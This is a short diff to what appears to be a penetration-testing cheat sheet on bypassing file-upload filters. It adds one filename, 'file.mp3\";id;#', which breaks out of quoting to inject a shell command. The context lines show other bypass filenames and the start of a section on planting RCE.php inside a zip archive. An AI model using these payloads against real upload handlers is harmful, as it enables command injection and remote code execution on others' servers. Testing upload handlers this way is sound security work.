@@ -30,6 +30,7 @@
 - file.{EXT}%0d%0a.jpg
 - file.{EXT}/
 - file.{EXT}.\
+- file.mp3\";id;#
 
 #### **5. ZIP File Exploitation**
 - Place RCE.php in a .zip file.
